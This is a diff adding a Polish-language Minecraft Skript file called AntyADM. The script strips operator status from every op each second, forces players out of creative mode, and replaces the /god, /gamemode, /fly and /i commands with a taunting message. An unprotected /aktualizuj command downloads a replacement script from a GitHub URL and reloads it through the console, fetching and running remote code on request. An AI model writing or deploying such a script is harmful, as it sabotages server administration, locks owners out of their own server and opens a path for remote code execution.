@@ -1,0 +1,67 @@
+# AntyAdm GitHubUPDATE
+# WERSJA Z UPD
+
+# Funkcja On Load
+# Wiadomosci po zaladowaniu
+on load:
+	set {aadm::ostatnie} to 10042024
+	broadcast "&8[&b?&8] "
+	broadcast "&8[&b?&8] &aAntyADM &7zostal zaladowany!"
+	broadcast "&8[&b?&8] &7Data aktualizacji %{aadm::ostatnie}%"
+	broadcast "&8[&b?&8] "
+
+# Updater
+command /aktualizuj [<text>]:
+	trigger:
+		send "&8[&2&lX&8] &7Last %{aadm::ostatnie}%"
+		send "&8[&2&lX&8] &7Wczytywanie automatycznej aktualizacji..."
+		broadcast "&8[&b?&8] &bRozpoczeto automatyczna aktualizacje!"
+		broadcast "&8[&b?&8] &bMozliwe chwilowe opoznienie serwera!"
+		send "&8[&2&lX&8] &cUsuwanie pliku antyadm.sk"
+		delete file "plugins/Skript/scripts/antyadm.sk"
+		send "&8[&2&lX&8] &aUsunieto plik antyadm.sk"
+		send "&8[&2&lX&8] &cRozpoczynam pobieranie antyadm.sk - latest &b[GitHub]"
+		download file from "https://raw.githubusercontent.com/LocK3rX/antyadmsk/main/antyadm.sk" to file "plugins/Skript/scripts/antyadm.sk"
+		send "&8[&2&lX&8] &aPobrano antyadm.sk - latest &b[GitHub]"
+		send "&8[&2&lX&8] &2Zaktualizowano plik antyadm.sk!"
+		send "&8[&2&lX&8] &cExecute sk reload antyadm!"
+		execute console command "sk reload antyadm"
+		send "&8[&2&lX&8] &aExecuted sk reload antyadm!"
+		broadcast "&8[&b?&8] &2Aktualizacja zakonczona!"
+
+# Petla every 1s
+every 1 second:
+	loop all players:
+		if loop-player is op:
+			deop the loop-player
+			broadcast "&8[&c&l!&8] "
+			broadcast "&8[&c&l!&8] &4Wykryto OPa na serwerze!"
+			broadcast "&8[&c&l!&8] "
+		if gamemode of loop-player is creative:
+			set gamemode of loop-player to survival
+			broadcast "&8[&c&l!&8] "
+			broadcast "&8[&c&l!&8] &4Wykryto tryb kreatywny na serwerze!"
+			broadcast "&8[&c&l!&8] "
+
+# Petla every 120s usunieta
+
+# Komenda wersja
+command /antyadm [<text>]:
+	trigger:
+		broadcast "&8[&b?&8] "
+		broadcast "&8[&b?&8] &7AntyADM jest &aaktywny"
+		broadcast "&8[&b?&8] "
+
+# Blokady komend
+command /god [<text>]:
+	trigger:
+		send "&8[&c&l!&8] &cCos cie boli chyba XD"
+command /gamemode [<text>]:
+	trigger:
+		send "&8[&c&l!&8] &cCos cie boli chyba XD"
+command /fly [<text>]:
+	trigger:
+		send "&8[&c&l!&8] &cCos cie boli chyba XD"
+command /i [<text>]:
+	trigger:
+		send "&8[&c&l!&8] &cCos cie boli chyba XD"
